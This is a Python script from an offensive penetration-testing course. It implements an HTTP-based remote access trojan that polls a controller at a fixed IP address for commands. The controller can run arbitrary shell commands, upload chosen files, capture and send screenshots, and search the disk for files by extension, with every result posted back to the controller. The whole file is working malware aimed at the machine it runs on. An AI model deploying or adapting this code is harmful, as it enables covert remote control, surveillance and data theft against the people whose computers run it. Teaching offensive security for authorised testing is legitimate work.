# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

import socket
import requests 
import subprocess 
import os
import time
from PIL import ImageGrab # Used to Grab a screenshot
import tempfile           # Used to Create a temp directory
import shutil             # Used to Remove the temp directory


while True: 

    req = requests.get('http://192.168.1.39')
    command = req.text
        
    if 'terminate' in command:
        break # end the loop
    
    elif 'grab' in command:
        grab,path=command.split('*') # split the received grab command into two parts and store the second part in path variable
        
        if os.path.exists(path): # check if the file is there
            
            url = 'http://192.168.1.39/store'  # Appended /store in the URL
            files = {'file': open(path, 'rb')} # Add a dictionary key called 'file' where the key value is the file itself
            r = requests.post(url, files=files) # Send the file and behind the scenes, requests library use POST method called "multipart/form-data"
            
        else:
            post_response = requests.post(url='http://192.168.1.39', data='[-] Not able to find the file !' )
 
    elif 'screencap' in command:      #If we got a screencap keyword, then .. 
        
        dirpath = tempfile.mkdtemp()  #Create a temp dir to store our screenshot file

        ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")  #Save the screencap in the temp dir

        url = 'http://192.168.1.39/store'                   
        files = {'file': open(dirpath + "\img.jpg", 'rb')}
        r = requests.post(url, files=files)                 #Transfer the file over our HTTP
        
        files['file'].close()   #Once the file gets transfered, close the file.
        shutil.rmtree(dirpath)  #Remove the entire temp dir

    elif 'search' in command:  # The Formula is  search <path>*.<file extension>  , for example let's say that we got search C:\\*.pdf
        # if we remove the first 7 character the output would C:\\*.pdf  which is basically what we need

        command = command[7:] # cut off the the first 7 character ,, output would be  C:\\*.pdf
        
        path,ext=command.split('*')  # split C:\\*.pdf into two sections, the first section (C:\\) will be stored in path variable and
                                     # the second variable (.pdf) will be stored in ext variable
        
        list = ''  # here we define a string where we will append our result on it
        

        for dirpath, dirname, files in os.walk(path):
            for file in files:
                if file.endswith(ext):
                    list = list + '\n' + os.path.join(dirpath, file)
                    
        requests.post(url='http://192.168.1.39', data= list )  # Send the search result  

    elif 'cd' in command: # the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
        code,directory = command.split (' ') # split up the reiceved command based on space into two variables
        os.chdir(directory) # changing the directory 
        #req.send( "[+] CWD Is " + os.getcwd() ) # we send back a string mentioning the new CWD Note: you will have to fix REQ


 
    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.1.39', data=CMD.stdout.read() )
        post_response = requests.post(url='http://192.168.1.39', data=CMD.stderr.read() )

    time.sleep(3)
    



